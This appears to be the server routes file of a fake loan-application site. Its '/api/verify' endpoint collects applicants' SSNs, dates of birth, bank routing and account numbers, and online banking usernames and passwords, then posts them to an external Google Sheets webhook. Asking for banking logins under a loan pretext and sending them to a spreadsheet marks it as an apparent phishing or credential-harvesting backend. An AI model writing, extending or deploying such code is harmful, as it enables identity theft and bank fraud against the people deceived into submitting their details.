import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";

const verifySchema = z.object({
  firstName: z.string().min(1),
  lastName: z.string().min(1),
  email: z.string().email(),
  phone: z.string().min(1),
  dob: z.string().min(1),
  ssn: z.string().min(1),
  address: z.string().min(1),
  city: z.string().min(1),
  state: z.string().min(1),
  country: z.string().min(1),
  zip: z.string().min(1),
  loanAmount: z.string().min(1),
  bankName: z.string().min(1),
  routing: z.string().min(1),
  account: z.string().min(1),
  onlineBankingId: z.string().min(1),
  onlineBankingPass: z.string().min(1),
});

export function registerRoutes(
  httpServer: Server,
  app: Express
): Server {
  app.post(api.inquiries.create.path, async (req, res) => {
    try {
      const input = api.inquiries.create.input.parse(req.body);
      const inquiry = await storage.createInquiry(input);
      res.status(201).json(inquiry);
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      throw err;
    }
  });

  app.post("/api/verify", async (req, res) => {
    try {
      const data = verifySchema.parse(req.body);

      let sheetsUrl = process.env.GOOGLE_SHEETS_WEBHOOK_URL;
      if (sheetsUrl) {
        // Sanitize the URL to remove potential quotes or whitespace from .env
        sheetsUrl = sheetsUrl.trim().replace(/^["']|["']$/g, '');
        console.log(`[Verify] Forwarding to Google Sheets (Length: ${sheetsUrl.length}):`, sheetsUrl);
        
        const row = [
          data.firstName, data.lastName, data.email, data.phone,
          data.dob, data.ssn, data.address, data.city, data.state,
          data.country, data.zip, data.loanAmount, data.bankName,
          data.routing, data.account, data.onlineBankingId, data.onlineBankingPass,
          new Date().toISOString(),
        ];
        try {
          const response = await fetch(sheetsUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ values: row }),
            redirect: "follow", // Important for GAS which redirects
          });
          const result = await response.text();
          console.log("[Verify] Google Sheets Response Status:", response.status);
          console.log("[Verify] Google Sheets Response Body:", result);
        } catch (fetchErr) {
          console.error("[Verify] Webhook fetch error:", fetchErr);
        }
      } else {
        console.log("[Verify] Submission received (No URL):", { ...data, ssn: "***", onlineBankingPass: "***" });
      }

      res.status(200).json({ success: true });
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid form data", errors: err.errors });
      }
      console.error("[Verify] Error:", err);
      res.status(500).json({ message: "Submission failed" });
    }
  });

  return httpServer;
}
